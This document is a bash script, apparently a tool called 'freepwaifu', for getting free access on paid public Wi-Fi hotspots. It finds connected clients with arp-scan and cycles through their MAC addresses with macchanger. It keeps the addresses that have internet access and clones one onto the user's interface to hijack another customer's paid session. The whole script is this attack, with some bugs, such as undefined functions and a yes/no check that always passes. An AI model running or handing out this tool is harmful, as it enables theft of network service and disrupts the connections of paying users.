#! /usr/bin/bash
# Just a mac intended for public paid wifi internet hotspots
# get user with internet / switch between users who had internet

#Declaring variables
red='\033[1;31m'
Yellow='\033[1;33m'
blue='\033[7;34m'
export purple='\033[1;35m'
reset='\033[0m'
#Dancing panda Variables
export purple_panda='\033[6;35m'

#configuration files & data files
online="online_users.txt"
total_users="allusers.txt"
complete_users="users.txt"
    #file paths shortened for no reason
config_path="/tmp/freep"
previous_config_path="/tmp/freep/freepcollections"
#freepwaifu new logo\
function banner {
  local epic=$1
  local epic_say=$2
echo -e ${epic}"
                    |───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───|
█▀▀ █▀█ █▀▀ █▀▀ █▀█ |───█▒▒░░░░░░░░░▒▒█───|
█▀░ █▀▄ ██▄ ██▄ █▀▀ |────█░░█░░░░░█░░█────|
                    |─▄▄──█░░░▀█▀░░░█──▄▄─|  █░█░█ ▄▀█ █ █▀▀ █░█
                    |█░░█─▀▄░░░░░░░▄▀─█░░█|  ▀▄▀▄▀ █▀█ █ █▀░ █▄█"${reset}
        echo ""
        echo -e ${Yellow} "$epic_say "${reset}
        echo -e ${blue}"＊${reset}.${purple_panda} ᐅᐅ"${reset}
}
#length time functions
function drowsy_1 {
    local drunk=$1
    sleep ${drunk} 
}
epic="$purple_panda"
banner "$epic" "＊ ＊ ＊ Loading ＊ ＊ ＊" 
#Temporary file management written poorly but exists for some reason
if [[ -d $config_path ]]; then
    echo -e "[✔] ${Yellow} located alien spacecship....${reset}"
    drowsy_1 "1"
    if [[ -f $config_path/$total_users ]]; then
        echo -e "[✔] ${Yellow} Found and killed alien life.. ${reset}"
        rm -rf $config_path/$total_users
        drowsy_1 "1"
    else
        drowsy_1 "1"
        echo -e "[＊]${Yellow} Alien life not found ${reset}"
    fi
     if [[ -f $config_path/$complete_users ]]; then
        echo -e "[✔] ${Yellow} Found and killed alien life.. ${reset}"
        rm -rf $config_path/$complete_users
        drowsy_1 "1"
    else
        drowsy_1 "1"
        echo -e "[＊]${Yellow} Alien life not found ${reset}"
    fi
     if [[ -f $config_path/$online ]]; then
        echo -e "[✔] ${Yellow} Found cute alien , storing her... ${reset}"
        cat "$config_path/$online" >> $previous_config_path/$online
        rm -rf $config_path/$online
        drowsy_1 "1"
    else
        drowsy_1 "1"
        echo -e "[＊]${Yellow} Alien life not found ${reset}"
    fi
else
    mkdir {"$config_path/","$previous_config_path/"}
    echo -e "${Yellow} ..Initialised configuration files ${reset}"
    drowsy_1 "1"
    clear
fi   
#Userfull functions
get_interface(){
   interface=$(iw dev | awk '$1=="Interface"{print $2}') 
}
disable_wifi_iface(){
    #sudo ifconfig $interface down
    nmcli radio wifi off
    #nmcli d disconnect $interface &>/dev/null
    
}
enable_wifi_iface(){
    #sudo ifconfig $interface up
    nmcli radio wifi on
    #nmcli d connect $interface &>/dev/null
}
select_point(){
    if [[ -f $previous_config_path/$online ]]; then
        output=$(cat $previous_config_path/$online | fzf)
        get_interface
        disable_wifi_iface
        ifconfig $interface hw ether $output
        enable_wifi_iface
        echo -e "[✔] ${Yellow} Happy Hacking ${reset}"
    else
        echo -e "[◉] ${Yellow} Alien life was not found, Run live scan ${reset}"
    fi

}

wifi_spoof_tool(){
    echo -e "${Yellow} Enter the public paid wifi name....${reset}"
    read wifiname_1
    nmcli d wifi connect "${wifiname_1}" &> /dev/null
    drowsy_1 "5"
    sudo arp-scan -l | awk '/.*:.*:.*:.*:.*:.*/{print $2}' >> $config_path/$total_users
    tail -n +4 $config_path/$total_users >> $config_path/$complete_users
    tots=$(wc -l $config_path/$complete_users | awk '{print $1}')
    echo -e "${Yellow} $tots users connected to network ${reset}"
    input="$config_path/$complete_users"
    while IFS= read -r user
    do
        get_interface
        #disable_wifi_iface
        nmcli radio wifi off
        drowsy_1 "3"
        sudo macchanger -bm=${user} $interface &>/dev/null
        drowsy_1 "3"
        nmcli radio wifi on
        #enable_wifi_iface
        drowsy_1 "5"
        nmcli d wifi connect "${wifiname_1}" &>/dev/null
        drowsy_1 "5"
        Routing_to=$(ip route show default | awk '/default/ {print $3}')
        echo -e "${purple} [~]${reset} Checking interent connectivity on ${Yellow} $user ${reset} ... Route:_ ${purple} $Routing_to ${reset}"
        # Set the URL to ping
        url=www.google.com
        result=$(ping -c 3 "$url" > /dev/null && echo "Connected" || echo "Not Connected")
        # Check the result
        if [ "$result" = "Connected" ]; then
            echo -e "${Yellow} [✔] ${reset} ${purple} Internet available ${reset}"
            echo "$user" >> $config_path/$online
        else
            echo -e "${purple}[${reset}${red}＊${reset}${purple}]${reset} ${red} No internet conections ${reset}"
        fi

		# PING_TARGET="google.com"
        # PING_RESULT=$(ping -c 1 "$PING_TARGET" 2>&1)
        # #wget -q --tries=20 --timeout=10 --spider google.com
		# if [[ $? -eq 0 ]]; then
		# 	echo -e "${Yellow} [✔] ${reset} ${purple} Internet available ${reset}"
		# 	echo "$user" >> $config_path/$online
		# else
		# 	echo -e "${purple}[${reset}${red}＊${reset}${purple}]${reset} ${red} No internet conections ${reset}"
		# fi
    done < "$input"
	echo -e "${Yellow} Would you like 2 set a live user from scanned [y/n] ${reset}"
	read part2
	if [[ "$part2" == "y" || "yes" || "Y" || "Yes" || "YES" ]]; then
		if [[ -f $config_path/$online ]]; then
			output=$(cat $config_path/$online | fzf)
			get_interface
			kill_wifi
			#sudo macchanger --mac=${output} $interface $>/dev/null
            sudo ifconfig $interface hw ether $output
			wake_wifi
			echo -e "[✔] ${Yellow} Happy hacking if successfull ${reset}"
		else
			echo -e "[◉] ${Yellow} You lets check storage"
			sleep 2
			select_point

		fi
    fi
}
clear
epic="$purple"
banner "$epic" "© Yada 2022 --Made with Love For Educational Purposes" 
cat << EOF
Choose your Poison:
    1. Scan for live internet user
    2. Select live user from file
    3. Remove all alien life
    0. Quit
EOF
echo -n 'Enter selection [0-quit]: '
read -r poison

case $poison in
	0) echo "Program terminated.";;
	1) wifi_spoof_tool ;;
	2) select_point ;;
	3)
		rm -rf /tmp/freep
	;;
	*)
		echo "Invalid entry." >&2
		exit 1
esac
